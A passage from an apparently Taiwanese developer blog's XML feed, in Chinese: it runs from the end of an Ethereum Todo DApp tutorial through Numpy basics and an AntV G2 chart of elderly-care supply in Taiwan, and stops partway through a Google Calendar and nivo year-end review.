blockNumber: 61,  //   event: &quot;OnTodoAdded&quot;,  //   signature: &quot;0x6edbfebf4adc3e180444860a21cd838446f00049410a44c6ec4a178a2ebe529b&quot;,  //   transactionHash: &quot;0x997195a40d9ad102b0c18b730711fec0623596643c5820253296415b816563a3&quot;,  //   transactionIndex: 0,  //   type: &quot;mined&quot;  // &#125;  const &#123; returnValues: &#123; todoId &#125; &#125; = result;  // 因為事件的回傳值只有 todoId，因此還需要取得完整的 todo 資料。  const todo = await todoHelper.getTodoAsync(todoId);  store.dispatch(addTodo(todoId, todo[0], todo[1]));  console.log(&#x27;Add&#x27;, todoId);&#125;);

Step6. 獲取過去的事件區塊鏈可以視為一個保存操作紀錄並且確保這些紀錄無法被竄改的資料庫，因此上述的操作事件都會被紀錄在區塊鏈上，web3 提供 getPastEvents 這個 api 來取得過去的事件（web3 在 v1.0 版本前要取得過去的事件需要持續監聽，而非直接傳回結果）
// ethereum-todo/src/helpers/todoHelpers/eventLogs.jsimport todoContract from &#x27;contracts/todoContract&#x27;;export async function getAllEventsAsync() &#123;  const events = await todoContract.getPastEvents(&#x27;allEvents&#x27;, &#123;    // 也就是取得從第一個區塊到最新區塊的所有事件    fromBlock: 0,    toBlock: &#x27;latest&#x27;  &#125;);  // events 是一個陣列，陣列元素與前述監聽事件的回傳值相同  return events;&#125;

透過以上的兩個部分已經可以利用智慧合約在區塊鏈上寫一個 Todo DApp，不過使用的方式仍然相當侷限，也忽略不少實際上可能會碰到的問題，事實上光是如何適當的儲存資料在區塊鏈上就是一大挑戰，這個專案可以當作簡單基底，繼續深入研究。
參考資料
Ethereum區塊鏈！智能合約(Smart Contract)與分散式網頁應用(DApp)入門
What is different between a transaction and a call
比較 requre, assert, 和 revert 及其運作的方式
How to listen for contract events in javascript tests
在公開測試鏈上部署合約。
深入智能合約 ABI

關於作者：@cychien 喜愛閱讀，熱愛動手作，相信未來建立在對歷史的理解上
]]></content>
      <tags>
        <tag>ethereum</tag>
        <tag>smart contract</tag>
        <tag>dapp</tag>
      </tags>
  </entry>
  <entry>
    <title>從零開始學資料科學：Numpy 基礎入門</title>
    <url>/2017/07/28/data-science-101-numpy-tutorial/</url>
    <content><![CDATA[
前言本系列文章將透過系統介紹資料科學（Data Science）相關的知識，透過 Python 帶領讀者從零開始進入資料科學的世界。這邊我們將介紹 Numpy 這個強大的 Python 函式庫。
什麼是 Numpy？Numpy 是 Python 的一個重要模組（Python 是一個高階語言也是一種膠水語言，可以透過整合其他低階語言同時擁有效能和高效率的開發），主要用於資料處理上。Numpy 底層以 C 和 Fortran 語言實作，所以能快速操作多重維度的陣列。當 Python 處理龐大資料時，其原生 list 效能表現並不理想（但可以動態存異質資料），而 Numpy 具備平行處理的能力，可以將操作動作一次套用在大型陣列上。此外 Python 其餘重量級的資料科學相關套件（例如：Pandas、SciPy、Scikit-learn 等）都幾乎是奠基在 Numpy 的基礎上。因此學會 Numpy 對於往後學習其他資料科學相關套件打好堅實的基礎。
Numpy 基礎操作

Numpy 陣列 Numpy 的重點在於陣列的操作，其所有功能特色都建築在同質且多重維度的 ndarray（N-dimensional array）上。ndarray 的關鍵屬性是維度（ndim）、形狀（shape）和數值類型（dtype）。 一般我們稱一維陣列為 vector 而二維陣列為 matrix。一開始我們會引入 numpy 模組，透過傳入 list 到 numpy.array() 創建陣列。
 # 引入 numpy 模組import numpy as npnp1 = np.array([1, 2, 3])np2 = np.array([3, 4, 5])# 陣列相加print(np1 + np2) # [4 6 8]# 顯示相關資訊print(np1.ndim, np1.shape, np1.dtype) # 1 (3,) int64 =&gt; 一維陣列, 三個元素, 資料型別np3 = np.array([1, 2, 3, 4, 5, 6])

 從檔案取資料：
 npd = np.genfromtxt(&#x27;data.csv&#x27;, delimiter=&#x27;,&#x27;)

 改變陣列維度：
 np3 = np3.reshape([2, 3])print(np3.ndim, np3.shape, np3.dtype) # 2 (2, 3) int64

 改變陣列型別（bool、int、float、string）：
 bool 可以包含 True、False，int 可以包含 int16、int32、int64。其中數字是指 bits。float 可以包含 16、32、64 表示小數點後幾位。string 可以是 string、unicode。nan 則表示遺失值。
 np3 = np3.astype(&#x27;int64&#x27;)np3.dtype# dtype(&#x27;int64&#x27;)

建立陣列 建立填滿 0 或 1 的陣列：
 np1 = np.zeros([2, 3]) # array([[ 0.,  0.,  0.], [ 0.,  0.,  0.]])np2 = np.ones([2, 3]) # array([[ 1.,  1.,  1.], [ 1.,  1.,  1.]])



陣列索引與切片 一維陣列操作和 Python 原生 list 類似：
 np3 = np.array([1, 2, 3, 4, 5, 6])print(np3[2]) # 3    

 二維陣列：
 np3 = np3.reshape([2, 3])print(np3[1, 0]) # 4



基本操作 使用布林遮罩來取值：
 np3 = np.array([1, 2, 3, 4, 5, 6])print(np3 &gt; 3) # [False False False  True  True  True]print(np3[np3 &gt; 3]) # [4 5 6]

 加總：
 np3 = np3.reshape([2, 3])print(np3.sum(axis=1)) # 將 axis=1 橫向加總 [6 15]

總結以上介紹了 Numpy 的基礎知識，建立了基本的 array 和 ndarray 的觀念。相信在熟悉 Numpy 之後 Pandas 的學習將會比較容易 （Pandas 的資料容器 DataFrame、Series 事實上是奠基在 Numpy 的陣列上）
延伸閱讀
7 Steps to Mastering Machine Learning With Python
[python] numpy axis概念整理筆記

（image via berkeley、codingeek、cornell、scipy-lectures）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>機器學習</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>人工智慧</tag>
        <tag>監督式學習</tag>
        <tag>Supervised learning</tag>
        <tag>從零開始學資料科學</tag>
        <tag>Numpy</tag>
        <tag>資料科學</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 AntV 製作資料圖表-台灣老年人口與長照機構供需比</title>
    <url>/2018/08/25/datavis-antv/</url>
    <content><![CDATA[前言隨著年齡增長，多少開始會遇到家人或親戚需要長期照護，入住療養院或醫院的狀況，接者就會發現許多照護中心可是一位難求，院中的照服人員或是醫護人員也得以一擋百，讓我很想知道目前台灣整體來說，老年人口、長照機構與照服人員的比例失衡有多嚴重。而剛好在前陣子 @huli 大大介紹了Ant design，讓我再次注意到同樣為螞蟻金服出品的 AntV，稍微研究之下發現它使用起來非常簡單快速，並且一樣有 React、Angular 與 Vue 的版本。所以今天這篇文章想藉由實作台灣老年人口與長照機構供需比的資料圖表，順便介紹 AntV 這套資料視覺化的套件。
對了，報導者有發表過一系列專輯 - 長照機構裡的大象——10萬老人被照顧的真相，說明台灣長照產業的現況，如果懶得看我長篇大論的技術文章，拜託至少在離開前去看一下報導者的專輯，這樣我也算功德一件，讓更多人知道長照產業的重要性，或許也就有那麼一些人有辦法解決這個鮮少被提起的問題。
先看個成果：
See the Pen 總體台灣老年人口與長照機構供需比 - AntV - demo by Arvin (@arvin0731) on CodePen.



我依照 Wiki 上的台灣地理區劃分將資料北、中、南、東與外島五個區塊，並加上兩個按鈕，可以把資料量較少的外島去除，用來展示 G2 在處理資料切換時的順暢感。
看得出來其實就是個非常簡單用 Excel 也畫得出來的分組長條圖，但實際上你會發現，透過 AntV 製作完全不會比用 Excel 麻煩，還支援 RWD 與資料的切換動畫！真的非常適合我這次想要快速拉出一個比較圖表的狀況！
AntV
AntV 其實包含了三個不同應用情境的套件：G2、G6、F2。

G2: 包含各種圖表元素的集成，大多數的應用場景都可以從 G2 中找到對應合適的元件。
G6: 主要是針對流程圖與關聯性分析的圖表元件，甚至能利用 G2 繪製資料庫的 ER Diagram 與時序圖。
F2: 針對 Mobile 的使用情境來特別加強圖表在 performance 上的表現，主要繪製在 canvas 上。

今天我們使用 G2 來開發這幾套由螞蟻金服開發的視覺化套件，除了遵照 Antd 的設計語言外，針對圖表的設計製作上，深受 The Grammar of Graphics 這本巨作的影響，也是 G2 的名稱的由來。

G2 的強大是由其背後的一套圖形語法所支撐的，它基於《The Grammar of Graphics》(Leland Wilkinson 著)一書，是一套用來描述所有統計圖形深層特性的語法規則，該語法回答了『什麼是統計圖形』這一問題，以自底向上的方式組織最基本的元素形成更高級的元素。由此，G2 所建構出的圖表是由一系列獨立的圖形語法元素組合而成的 – AntV G2 官網

我並沒有看過那本書，也沒有仔細研究 G2 的原始碼，但這敘述聽起來就超厲害的，整個工具是建構在一套完整的理論基礎上頭。
在 G2 的世界中，並沒有明確定義一般的圖表類型，像是長條圖、折線圖等等，是依照一系列的圖形語法元素組合成的結果來決定其類型。
所謂的圖形語法元素大概就是包含：

DataSet 資料集操作
Scale 度量
Geom 幾何標記（point, line, area, shape, etc）
Attr 圖形屬性
Coord 座標系
Axis 座標軸
Legend 圖例
Tooltip 提示訊息
Guide 輔助元素
Facet 分面 （將一份資料按照某個維度分隔成若干子集）
Label 標籤
Theme 主題
Event 圖表事件

在官方文件上上針對不同的元素都有非常詳細的說明與範例，而且都有中文文件（雖然是簡體…），是 AntV 的絕大優點之一。
透過操作這些不同元素的組合，可以很容易的切換圖表類型，以 Coord 為例：
chart.coord(&#39;coordType&#39;[, cfg]);
在同樣的資料集上，透過上述的方式來轉換座標軸，馬上就可以從層疊長條圖切換為圓餅圖：
 圖片來源
或是透過自定義 Shape，快速將一般的長條圖，改變成三角形的形狀：
See the Pen AntV-G2-demo by Arvin (@arvin0731) on CodePen.


由於這樣的設計理念與基礎，G2 比起其他一樣提供較為高階視覺化語法的套件來說，彈性大了不少。
開始進行實作，視覺化總要有個方向，走，我們先從資料搜集開始！首先，要想知道老年人口以及長照機構的比例，我們需要找到依照年齡分組的人口統計資料，這可以從內政部的人口資料庫中找到「年底人口數按性別及五歲年齡組分」的資料表，從民國 35 年到 106 年都有，算是蠻齊全的。我們選取 85 ~ 100+ 以上的資料當作老年人口。
2017 年的部分計算出來後大約是：368,757 人

接著，到衛福部統計處找尋長期照顧機構的相關資料。
可以找到 2017 年長照與安養機構總數的可供進住人數，大約 57,147 人：

以及 2017 年老人長期照顧、安養機構工作人員人數，大約 19,064 人（只計算護理人員與照顧服務人員）：

上述的資料來源都有個別縣市的統計資料，上面數字是我將各縣市加總的結果，可能多少會有誤差，大家別介意啊…整體比例應該不會差太多。
接著使用 G2 來進行視覺化要使用 G2 很簡單，只要在 HTML 中載入 &lt;script src=&quot;https://gw.alipayobjects.com/os/antv/assets/g2/3.0.9/g2.min.js&quot;&gt;&lt;/script&gt; 即可。
接著將剛剛的資料定義好：
const SimpleAll = [  &#123;name: &#x27;可供進住人數&#x27;, value: 57147&#125;,  &#123;name: &#x27;長照、養護人員&#x27;, value: 19064&#125;,  &#123;name: &#x27;老年人口數(85~100+)&#x27;, value: 368757&#125;];

我們就可以透過 G2.Chart 來定義圖表：
const chart = new G2.Chart(&#123;  container: &#x27;mountNode&#x27;,  forceFit: true,  height: window.innerHeight&#125;);

我們 new 一個 G2.Chart 的 instance，並且同時傳入三個參數給予建構：

container: 指定你的圖表要掛載在 DOM 中的哪個位置，對應於 HTML 中元素的 id 值。
forceFit: 超方便的參數，只要設定為 true，你的圖表就能 Responsive，因此也不用再設定寬度。
height: 可以額外定義需要的圖表高度。

再來我們把資料與圖表做綁定：
chart.source(SimpleAll);

接著便能開始設定我們的圖表長相：
chart  .interval()  .position(&#x27;name*value&#x27;)  .color(&#x27;name&#x27;)  .adjust([&#123;    type: &#x27;dodge&#x27;,    marginRatio: 1 / 5  &#125;]);

先前說過，G2 中沒有區分圖表類型，利用的是各種不同的幾何標記來組成圖表，如果要製作長條圖，需要用到的就是 ìnterval() 這個幾何標記，G2 還支援：point(), path(), line(), area(), polygon(), edge(), schema(), heatmap() 這幾種類型，官網有更詳細的介紹
宣告我們需要的幾何圖形後，接著就會想知道我們要怎麼將資料映射到對的位置，並且給予不同的顏色區別。
而這一切在 G2 中都非常的簡單直覺。
透過 position(&#39;name*value&#39;) 這個 API，我們指定資料欄位的 name 要對應到圖表座標軸上的 x，而 value 對應到 y，到這邊為止，我們就能畫出一個擁有完整資訊的圖表：


當然這樣還不夠，至少也要用顏色來區別一下不同的資料類別。利用 color(name) 來告訴 G2，我們要根據資料的 name 欄位，用不同的顏色來區分。


G2 的 API 通常都能接收一個以上的參數，以 color 為例，除了直接傳入顏色要對應的資料欄位外，也可以直接輸入某個顏色，讓他 apply 到整個圖表；或是傳入 callback，在 callback 中根據欄位數值做邏輯上的著色動作。
// 可以參考官網 API Doc https://antv.alipay.com/zh-cn/g2/3.x/api/geom.html#_colorchart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;); // 使用默認的顏色chart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;, [ &#x27;red&#x27;, &#x27;blue&#x27; ]); // 使用傳入的指定顏色chart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;, (value) =&gt; &#123;  if(value === 1) &#123;    return &#x27;red&#x27;  &#125;  return &#x27;blue&#x27;;&#125;);

接著我們還可以加點東西讓圖表活潑一點。chart.point()  .position([&#x27;name&#x27;, &#x27;value&#x27;])  .size(50)  .shape(&#x27;name&#x27;, function (name) &#123;    return [&#x27;image&#x27;, imageMap[name]];  &#125;);

我們在原本的 interval 幾何圖形上加上另一個幾何圖形 point，位置一樣將 (name, value) 映射到 (x, y)。
相信眼尖的你會發現，position 的參數除了一開始的 (name*value) 外，也可以傳遞 array 形式。
接著設定 size 為 50；在幾何圖形 point 中，size 代表原點的半徑，如果是 interval 則代表柱體寬度，line 則是線段寬度。
還有個特殊的 shape() 函式，他讓我們可以指定特定資料欄位（在這邊我們用 name），將其轉換成不同的型態，像是這邊我們就把單純的 point mapping 成圖片，而這一切只要透過一個 callback 函數，回傳對應的結果即可！
See the Pen 2017 台灣總體老年人口與長照機構供需比 - AntV - demo by Arvin (@arvin0731) on CodePen.


短短幾行 code 就作出一個比一般 Excel 還要特別一些的圖表，真的蠻方便使用的對吧！
但只看全台灣總體的資料好像不太夠啊，能不能看一下各縣市的呢？當然可以。
只是每個縣市如果都要放三根長方體好像太密集了點，不是很適合，所以如同最前面的成品圖，將資料北、中、南、東與外島五個區塊，這樣圖表會比較清晰一點。
const data = [ &#123; name: &#x27;可供進住人數&#x27;,    &#x27;北部&#x27;: 25499,    &#x27;中部&#x27;: 11027,    &#x27;南部&#x27;: 18684,    &#x27;東部&#x27;: 1609,    &#x27;外島&#x27;: 328 &#125;,  &#123; name: &#x27;長照、養護人員&#x27;,    &#x27;北部&#x27;: 8994,    &#x27;中部&#x27;: 3518,    &#x27;南部&#x27;: 5997,    &#x27;東部&#x27;: 482,    &#x27;外島&#x27;: 73 &#125;,  &#123; name: &#x27;老年人口數(85~100+)&#x27;,    &#x27;北部&#x27;: 162443,    &#x27;中部&#x27;: 92071,    &#x27;南部&#x27;: 101846,    &#x27;東部&#x27;: 10197,    &#x27;外島&#x27;: 2200 &#125; ];

DataSet要想在同一圖表中呈現多組長條圖，我們需引進 G2 中 DataSet 的這個概念。
官網介紹
這張圖看似複雜，但其實很清楚的介紹了 DataSet 在使用 G2 製圖的過程中所扮演的角色：操作資料。
資料可以經由 Connector 傳入 DataSet 中，接著利用 Transforms 針對數據做處理（排序、統計、資料補齊），最後渲染到 DataView 中。
突然看到一堆名詞感覺有點嚇人？別擔心，待會的範例會慢慢講解，只要先把 DataSet 想成是存放資料的資料集，而 DataView 就是我們要繪製出來的資料視圖。
另外，一份 DataSet 可以連接多個 DataView，並透過更動其中的共用 State 來進行連動變更，在我們的範例中沒有使用到，但可以參考官網的清楚範例

回到我們的範例來跟剛剛的範例不同，我們在進行資料綁定前（chart.source(data)），需要先對數據做一些操作，所以要利用 DataSet 與 transform 兩個 API：
const ds = new DataSet();const dv = ds.createView().source(data);dv.transform(&#123;  type: &#x27;fold&#x27;,  fields: [ &#x27;北部&#x27;, &#x27;中部&#x27;, &#x27;南部&#x27;, &#x27;東部&#x27;, &#x27;外島&#x27;], // 展開資料  key: &#x27;區域&#x27;, // key, 設置新的 key/value 值，來對應新數據的含義。  value: &#x27;區域人數&#x27;, // value  retains: [ &#x27;name&#x27; ] // 想要保留在 transform 後的資料欄位&#125;);chart.source(dv);

透過 new DataSet() 與 createView() 創建出一個擁有 資料集 &lt;-&gt; 資料狀態連接 &lt;-&gt; 資料視圖 關聯性的物件 dv，接著利用 transform() 函數針對資料進行處理。
我們的資料是根據 可供進住人數&#39;、長照、養護人員 與 老年人口數來分類，但我們實際上希望的是能夠先依照區域劃分，在每個區域中再分別用這三種類別來比較資料。
因此在傳入 transform 的 option 中，我們選定 type 為 fold，其意義為：以指定字段集作為 Key，展開數據。並且設置新的 key&#x2F;value 值，來對應新數據的含義。
直接拿我們的資料來作為例子，比較一下前後結果就會很清楚了：
// 原始資料const data = [&#123;  name: &#x27;可供進住人數&#x27;, &#x27;北部&#x27;: 25499,&#x27;中部&#x27;: 11027,&#x27;南部&#x27;: 18684,&#x27;東部&#x27;: 1609,&#x27;外島&#x27;: 328&#125;, &#123;  name: &#x27;長照、養護人員&#x27;, &#x27;北部&#x27;: 8994, &#x27;中部&#x27;: 3518, &#x27;南部&#x27;: 5997, &#x27;東部&#x27;: 482, &#x27;外島&#x27;: 73&#125;, ...];// 經過 transform 後const dataBeenTransformed = [&#123;  key: &#x27;北部&#x27;, value: 25499, name: &#x27;可供進住人數&#x27;,&#125;, &#123;  key: &#x27;北部&#x27;, value: 8994, name: &#x27;長照、養護人員&#x27;,&#125;, &#123;  key: &#x27;中部&#x27;, value: 11027, name: &#x27;可供進住人數&#x27;,&#125;, &#123;  key: &#x27;中部&#x27;, value: 3518, name: &#x27;長照、養護人員&#x27;,&#125; ...];// 基本上，transform 後，原有的資料欄位會不見，這邊的 `name` 還保留是因為我有加入 `retains: [ &#x27;name&#x27; ]` 這個選項。

如此一來，我們在繪製圖表的時候，他就會依照目前的 Key, 將相同的 Key 所對應的值 Group 在一起，讓北部這個 Key 對應的三個欄位數值（可供進住人數、長照人員數、老年人口數）一起在同個分類（北部）中顯示。
不過，還沒有結束。
將資料分組後，依照先前的繪製方式，會畫出下面這樣的結果：
chart.interval().position(&#x27;區域*區域人數&#x27;).color(&#x27;name&#x27;);



雖然分組了，但資料重疊在一起了…囧
這是因為每個分組中的每個數據都套用到了同樣的 position 設定（區域*區域人數），我們必須要調整一下！
透過 adjust() 函數可以方便做到：
.adjust([&#123;  type: &#x27;dodge&#x27;,  marginRatio: 1 / 5&#125;])

設定 type 為 dodge，代表我們要調整的是分組數據，然後給予 margin 比例為 1&#x2F;5。
See the Pen 2017 台灣老年人口與長照機構供需比 - AntV - demo1 by Arvin (@arvin0731) on CodePen.


看起來就正常多了！
關於 transform 的運用，可以參考官方詳解 - Transform關於 adjust 的運用，目前支援四種 type：stack, dodge, jitter, symmetric。
神奇的是，這些不同類型的差異，在擁有豐富文檔的官方網站竟然找不到介紹，所以我其實也不太懂。重點是，不同的資料型態會有各自適合的 type，大家在製作時要記得都嘗試看看效果。
看起來蠻完整的了，但圖表沒辦法動態變化怎麼可以！沒錯，我也覺得不可以。
還好 AntV G2 讓我們輕鬆利用 chart.changeData() 就能同時更新 DataSet 與 DataView。更棒的是，除了提供 RWD 設計外，資料轉換過程中的動畫他也幫你照顧好好的。
除此之外，我們也能夠直接操作原有的 DataSet，像開頭的範例一樣，點選 button 時，我們透過 chart.filter 來過濾原有資料，並且在最後呼叫 chart.repaint() 進行 DataView 的重繪（一定要重繪才會 trigger DataSet 與 DataView 間的連動）：
const changeData = (status) =&gt; &#123;  chart.filter(&#x27;區域&#x27;, val =&gt; &#123;    if (status === &#x27;all&#x27;) &#123;      chart.scale(&#x27;區域人數&#x27;, &#123;        minLimit: 73      &#125;);      return true;    &#125;    chart.scale(&#x27;區域人數&#x27;, &#123;      minLimit: 400    &#125;);    return val !== &#x27;外島&#x27;;  &#125;);  chart.repaint();&#125;;

如此一來就能完成開頭的範例啦！
See the Pen 總體台灣老年人口與長照機構供需比 - AntV - demo by Arvin (@arvin0731) on CodePen.


結論如同我在前言提及的報導者專輯中所呈現的，台灣的長照產業正面臨很大的困境，只要家中有人有這種需求，相信都能有很深的體會。先前也曾有學長以長照產業為創業題目，可惜最終黯然收場，可見這問題真的有其嚴重與困難性存在。
身為前端開發者，或許目前能做的最大貢獻就是盡量製作出許多一目了然的資訊圖表、網頁專輯，讓更多的人知道問題的嚴重性，透過 AntV G2 這樣的工具，製作互動式圖表真的是越來越方便與容易，希望大家能多加貢獻，讓台灣社會往更好的方向走去！而小魯我能力不足分身乏術…先下台一鞠躬…


資料來源
AntV
G2
內政部戶政司人口資料庫
行政院性別平等統計資料庫
衛福部統計處-長期照顧統計
長照機構裡的大象——10萬老人被照顧的真相
Icon made by Freepik from www.flaticon.com

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>data visualization</tag>
        <tag>AntV</tag>
        <tag>G2</tag>
        <tag>RWD</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Google Calendar 與 nivo 製作自己的年終檢討報告</title>
    <url>/2018/12/15/dataviz-yearendreview/</url>
    <content><![CDATA[前言從 2017 年開始，我每天都會用 Google Calendar 紀錄生活，也在年底的時候利用 D3.js 與 Google api 將紀錄的資料視覺化出來做個年終回顧。（沒看過的讀者可以往這裡走：一起用 Google Calendar 與 D3.js 進行年終回顧吧！）
2018 當然也不例外，我依然持續記錄每天的日常，透過每週回顧自己的時間花費來調整目標與心理狀態。
而既然我有了兩年的資料，不拿來比較看看就太可惜了，因此決定在我今年的最後一篇文章中，將 2017 年與 2018 年的資料做個視覺化的比較，看看我在工作、生活、娛樂以及自我進修等上面的時間調配是否有照著我去年所希望的步調進行。在一年的尾聲，好好面對自己！
一樣先附上成果與 demo link：

工具工具的使用上，這次並沒有使用 D3.js，畢竟以需求來說，D3.js 太大材小用了，加上我前陣子發現一個基於 D3.js 與 React 的視覺化 library - nivo，看起來非常不錯，所以這次就拿這套來試試看，透過這套工具，整個作品大概不用花費一小時就可以完成了，大多的時間都是在處理資料格式上。
而抓取 Google Calendar 資料的部分，一樣使用 Google 的 api，只不過一年過去，Google api 也是有所更新，不過問題不大，稍微修改一些小地方即可，稍後會帶到。
視覺化的第一步，取得資料在一起用 Google Calendar 與 D3.js 進行年終回顧吧！中我有提到過，雖然 Google 有提供一個 Google Takeout 的功能，你也能直接匯出日曆，但是下載到的資料其格式都是 iCalendar，除非你在每個紀錄的項目上都有很詳細的紀錄內容，才有辦法去將每一項 task 都進行分類，像我只用顏色來區分的就沒辦法。

所以還是得靠 Google 提供的 Calendar API 來取得資料。
而 Google Calendar API 的使用方式很簡單，只要照著說明拿到憑證後，就可以從他們提供的範例 來修改實作。
基本上跟我去年寫的差不多，主要是在 auth 的套件（拿 cretential 的方式）以及 api 回傳的 schema 有所變動：
- var googleAuth = require(&#x27;google-auth-library&#x27;);+ const &#123; google &#125; = require(&#x27;googleapis&#x27;);// If modifying these scopes, delete token.json.// The file token.json stores the user&#x27;s access and refresh tokens, and is// created automatically when the authorization flow completes for the first// time.var SCOPES = [&#x27;https://www.googleapis.com/auth/calendar.readonly&#x27;];- var TOKEN_DIR = (process.env.HOME || process.env.HOMEPATH ||-  process.env.USERPROFILE) + &#x27;/.credentials/&#x27;;- var TOKEN_PATH = TOKEN_DIR + &#x27;calendar-nodejs-quickstart.json&#x27;;+ const TOKEN_PATH = &#x27;token.json&#x27;;

function listEvents(auth, pageToken) &#123;- var calendar = google.calendar(&#x27;v3&#x27;);+ const calendar = google.calendar(&#123;version: &#x27;v3&#x27;, auth&#125;);const queryOptions = &#123;  auth: auth,  calendarId: &#x27;primary&#x27;,  timeMax: (new Date()).toISOString(),  singleEvents: true,  orderBy: &#x27;startTime&#x27;&#125;;if (pageToken) &#123;  queryOptions.pageToken = pageToken;&#125;calendar.events.list(queryOptions, function (err, response) &#123;if (err) &#123;  console.log(&#x27;The API returned an error: &#x27; + err);  return;&#125;-var events = response.items;+const resData = response.data || &#123;&#125;;+const events = resData.items;if (events.length == 0) &#123;  console.log(&#x27;No upcoming events found.&#x27;);&#125; else &#123;  // ...&#125;// ...&#125;&#125;

完整的程式碼我一樣有放在 gist 上，如果你也想要用 Google API 下載自己的 Calendar，基本上除了 listEvents 函數內的部分以外，都可以直接照抄，listEvents 內的程式碼是 API 的 callback，主要是負責後續資料的處理，將之轉化成我們視覺化所需要的格式。而關於 Calendar api 相關參數的介紹，可以參考去年的文章。
nivo接下來介紹一下 nivo 這套工具。
它是 Raphaël Benitte 所製作，基於 D3.js 與 React.js 的視覺化套件。

比起市面上其他套件，我自己認為 nivo 的優勢有幾點：

對於 Server-side render 的支援度很高。

由於支援 React SSR，nivo 提供了 api 介面，讓你能透過 http request 產生圖表 - 詳情可看 nivo-api。

Mono repo 的方式管理 packages，可以依照需求，只安裝你需要的圖表 package。

宣告式的寫法，加上他互動式的文件範例，套用他的圖表幾乎沒有學習曲線。




部分元件提供 Canvas 實作的版本，大量數據也不怕！

動畫部分使用 react-motion，寫過 react 的人應該不陌生，react-motion 可說是 react 動畫界的翹楚啊！

每個元件都有對應的 Storybook 可以看，非常的 developer-friendly!


當然也是有缺點的：

不是每個元件都支援動畫，這時候會知道 D3.js 的好(?

圖表種類固定，比較難有創意的發揮。


基於以上的優缺點，不難看出，如果是對於不熟悉 D3.js 或是想要快速產出圖表，但又想要有動畫效果或是互動性的人來說，直接採用 nivo 這類的 library 會是很不錯的選擇，也是我這次採用的原因。
開始進行我們的圖表製作吧！基本的想法一樣是將資料用 Calendar 圖表呈現，觀察每種類別的 task 在一年中的分佈狀況，並且加入去年的資料來做對比。
接著，想利用一個折線圖來觀察單一類別在每個月的波動，是不是在某些月份我比較勤奮工作、某些月份很認真在進修或玩樂。當然這些資訊從 Calendar 圖表也看得出來，但是用月加總的數值呈現在折線圖上，感覺會更直接一點。
最後在把每種類別的資料集結起來，利用 Waffle 圖表，一目瞭然各個類別的比例關係。
要達成上面三個想法，我們只需要使用 nivo 的 @nivo&#x2F;calendar、@nivo&#x2F;line 與 @nivo&#x2F;waffle 三種套件即可。
使用方法都很簡單，基本上只要到對應的 doc 頁面，就直接有現成的程式碼可以複製參考。
像是 Calendar:

重點反而是資料格式，即便我們只是想繪製三種圖表，但就需要整理出三種資料格式，才能夠符合其各自的需求，一樣可以從 nivo 的 doc 中找到每個圖表所需要的資料格式（data tab）。
我製作範例的 parser 放在 github 上，有興趣可以參考，不過就只是一些髒髒的資料轉換，是個耗時費力的工作啊…
值得一提的是，這邊我除了轉化資料格式外，還花了不少時間在做資料的整理與同步。
為什麼呢？
因為每天的日誌是我自己手動輸入，顏色 label 也是我自己標記，有些事項的類別在 2017 年與 2018 年我用的是不同的顏色，但卻應該是分在同類中，這在做對比時，就會有問題了，因此花了不少時間從 2017 年一月開始過到 2018 年十二月…所以如果有人想跟我一樣這樣紀錄的話，或許可以用 Calendar 內建的分類功能，而不要像我一樣用手動標記顏色的方式。
總之，當資料處理好以後，照著網站範例將我們想要的元件放到頁面上即可，這邊我是直接用 CRA 製作 React SPA，其中 Calendar 的例子：
import React from &#x27;react&#x27;;import &#123; ResponsiveCalendar &#125; from &#x27;@nivo/calendar&#x27;const Calendar = (&#123;data&#125;) =&gt; (  &lt;ResponsiveCalendar        data=&#123;data&#125;        from=&quot;2017-01-01&quot;        to=&quot;2018-12-31&quot;        emptyColor=&quot;#eeeeee&quot;        colors=&#123;[            &quot;#61cdbb&quot;,            &quot;#97e3d5&quot;,            &quot;#e8c1a0&quot;,            &quot;#f47560&quot;        ]&#125;        margin=&#123;&#123;            &quot;top&quot;: 100,            &quot;right&quot;: 30,            &quot;bottom&quot;: 60,            &quot;left&quot;: 30        &#125;&#125;        yearSpacing=&#123;45&#125;        monthBorderColor=&quot;#ffffff&quot;        monthLegendOffset=&#123;10&#125;        dayBorderWidth=&#123;2&#125;        dayBorderColor=&quot;#ffffff&quot;        legends=&#123;[            &#123;                &quot;anchor&quot;: &quot;bottom-right&quot;,                &quot;direction&quot;: &quot;row&quot;,                &quot;translateY&quot;: 36,                &quot;itemCount&quot;: 4,                &quot;itemWidth&quot;: 34,                &quot;itemHeight&quot;: 36,                &quot;itemDirection&quot;: &quot;top-to-bottom&quot;            &#125;        ]&#125;    /&gt;);export default Calendar;

從上面的範例看得出來，你有許多 options 可以設定，像是資料的起始日期(from、to)、資料顏色的區間或是各種 margin 等都能調整，非常方便好用。
唯一要注意的是，如果採用支援 RWD 的元件（像是這邊用的 ResponsiveCalendar），記得要給定這個 Component 的 Parent component 固定的高度，否則 nivo 的元件偵測到高度為零時，就不會 render 了，所以記得要多加個有高度的 Wrapper 在 nivo 的元件上。
其他的實作細節基本上就是 React 而已，真的有興趣（想看看 code 有多鳥）可以到 github 瞧瞧。
最後分享一下我的年終檢討我記錄在 Google Calendar 上的 task，基本上分為六類：

English - 包含上英文線上課程、背單字、唸英文等
Entertainment - 所有娛樂事項
Sick&#x2F;Rehabilitation - 生病、做物理復健
Exercise - 運動
Training - 一切我認為跟加強我自身實力有關的事，有可能是看文章、寫 code 或是刷題
Work - 上班


Waffle 圖的數據是我將每個月的分類 task 加總後做平均所算出的比例。
而從 Waffle 圖可以很明顯看到，2018 年我對於 Training 與 English 這兩部分的分類，加重了不少。回想過去半年，很急切的想要有所突破，雖然我不覺得有達到我心中的努力程度，但以結果論來說，這些多出的 Training 或許真的幫助了我，讓我在今年達成了人生中一個小小的目標，有了逃離鬼島前往海外的機會。
若是從 Calendar 圖與折線圖來做兩個年度的對比，感受會更深一點：

